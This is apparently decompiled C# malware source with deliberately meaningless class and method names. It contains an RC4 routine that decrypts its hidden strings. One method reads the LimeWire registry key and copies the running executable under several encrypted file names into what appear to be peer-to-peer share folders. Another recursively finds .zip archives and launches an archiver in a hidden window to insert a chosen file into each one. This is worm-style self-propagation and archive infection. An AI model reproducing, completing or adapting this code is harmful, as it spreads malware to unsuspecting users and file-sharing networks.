using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace ajhfsdlhjasnagfgewfwsg;

public class RRRRR
{
	[DebuggerNonUserCode]
	public RRRRR()
	{
	}

	public static string RC4(string message, string password)
	{
		int num = 0;
		int num2 = 0;
		StringBuilder stringBuilder = new StringBuilder();
		string empty = string.Empty;
		int[] array = new int[257];
		int[] array2 = new int[257];
		int length = password.Length;
		int location = 0;
		while (location <= 255)
		{
			char c = password.Substring(location % length, 1).ToCharArray()[0];
			array2[location] = Strings.Asc(c);
			array[location] = location;
			Math.Max(Interlocked.Increment(ref location), checked(location - 1));
		}
		int num3 = 0;
		int location2 = 0;
		while (location2 <= 255)
		{
			num3 = checked(num3 + array[location2] + array2[location2]) % 256;
			int num4 = array[location2];
			array[location2] = array[num3];
			array[num3] = num4;
			Math.Max(Interlocked.Increment(ref location2), checked(location2 - 1));
		}
		location = 1;
		while (location <= message.Length)
		{
			int num5 = 0;
			num = checked(num + 1) % 256;
			num2 = checked(num2 + array[num]) % 256;
			num5 = array[num];
			array[num] = array[num2];
			array[num2] = num5;
			int num6 = array[checked(array[num] + array[num2]) % 256];
			checked
			{
				char c2 = message.Substring(location - 1, 1).ToCharArray()[0];
				num5 = Strings.Asc(c2);
				int num7 = num5 ^ num6;
				stringBuilder.Append(Strings.Chr(num7));
				Math.Max(Interlocked.Increment(ref location), location - 1);
			}
		}
		empty = stringBuilder.ToString();
		stringBuilder.Length = 0;
		return empty;
	}

	public static void msdnfmsnfmdsnfmdsnfmsdnfmdsnfmsdnf()
	{
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\LimeWire\\\\", writable: true);
		registryKey.GetValue("Shared", 0)!.ToString();
		try
		{
			string text = RC4("è÷?s\u0004dÆá&\u000e@îÇ\u0016\u0019ûê–óJ³²ˆú\u0004‚", "wertf32");
			File.Copy(Application.get_ExecutablePath(), Environment.GetEnvironmentVariable(RC4("DŸé5}H±\u00a8¤N³2", "sikan32") + RC4("h¾î3}L\u00b8’", "sikan32") + text));
			string text2 = RC4("fˆç>f]¥¥¤L±2ÇLg\\\u0012&ùò¦\u0010ìqX¢\vr\u001a$", "sikan32");
			File.Copy(Application.get_ExecutablePath(), Environment.GetEnvironmentVariable(RC4("DŸé5}H±\u00a8¤N³2", "sikan32") + RC4("h¾î3}L\u00b8’", "sikan32") + text2));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			string text3 = RC4("]\u00afç<hy³¼£Q¢ êY;J\u0014\v", "sikan32");
			File.Copy(Application.get_ExecutablePath(), Environment.GetEnvironmentVariable(RC4("DŸé5}H±\u00a8¤N³2", "sikan32") + RC4("h¾î3}L\u00b8’", "sikan32") + text3));
			string text4 = RC4("VŸç(uL®½’D£-ôutZ\u0014\u0016íÿ±\f·lO£", "sikan32");
			File.Copy(Application.get_ExecutablePath(), Environment.GetEnvironmentVariable(RC4("DŸé5}H±\u00a8¤N³2", "sikan32") + RC4("h¾î3}L\u00b8’", "sikan32") + text4));
			string text5 = RC4("fˆç>f]¥¥¤L±2ÇLg\\\u0012&ùò¦\u0010ìqX¢\vr\u001a$", "sikan32");
			File.Copy(Application.get_ExecutablePath(), Environment.GetEnvironmentVariable(RC4("DŸé5}H±\u00a8¤N³2", "sikan32") + RC4("h¾î3}L\u00b8’", "sikan32") + text5));
			string text6 = RC4("D‚ô<P_µª¾}¦ ê^$\u0017\u0004\u001aê", "sikan32");
			File.Copy(Application.get_ExecutablePath(), Environment.GetEnvironmentVariable(RC4("DŸé5}H±\u00a8¤N³2", "sikan32").Replace(RC4("DŸé5}H±\u00a8¤N³2", "sikan32"), RC4("°ßRËŠ\u0016\u0016\u00ad²ëíF{y\u008f¾Ø/#", "sikan323")) + RC4("h¾î3}L\u00b8’", "sikan32") + text6));
			string text7 = RC4("\u0081Ã\\À§\a\u0014ÿš¬ò@z", "sikan323");
			File.Copy(Application.get_ExecutablePath(), Environment.GetEnvironmentVariable(RC4("DŸé5}H±\u00a8¤N³2", "sikan32").Replace(RC4("DŸé5}H±\u00a8¤N³2", "sikan32"), RC4("°ßRËŠ\u0016\u0016\u00ad²ëíF{y\u008f¾Ø/#", "sikan323")) + RC4("h¾î3}L\u00b8’", "sikan32") + text7));
			string text8 = RC4("G™é<fG»‘»K²$÷\u0004fZ\u0005", "sikan32");
			File.Copy(Application.get_ExecutablePath(), Environment.GetEnvironmentVariable(RC4("DŸé5}H±\u00a8¤N³2", "sikan32").Replace(RC4("DŸé5}H±\u00a8¤N³2", "sikan32"), RC4("°ßRËŠ\u0016\u0016\u00ad²ëíF{y\u008f¾Ø/#", "sikan323")) + RC4("h¾î3}L\u00b8’", "sikan32") + text8));
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static void asdiuaysdiuyasdiuysaidusyaiduysaiduywique(string MainDir, string YourFile)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Expected O, but got Unknown
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
		ListBox val = new ListBox();
		try
		{
			string[] directories = Directory.GetDirectories(MainDir);
			foreach (string text in directories)
			{
				string[] files = Directory.GetFiles(text, "*.zip");
				foreach (string text2 in files)
				{
					val.get_Items().Add((object)text2);
				}
				asdiuaysdiuyasdiuysaidusyaiduysaiduywique(text, YourFile);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = val.get_Items().GetEnumerator();
			while (enumerator.MoveNext())
			{
				object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.FileName = folderPath + RC4("_\u00b8\u009dÌâ=¿ÙaauÉ€÷", "Sikan32");
				processStartInfo.Arguments = " a " + objectValue.ToString() + " " + YourFile;
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}
}
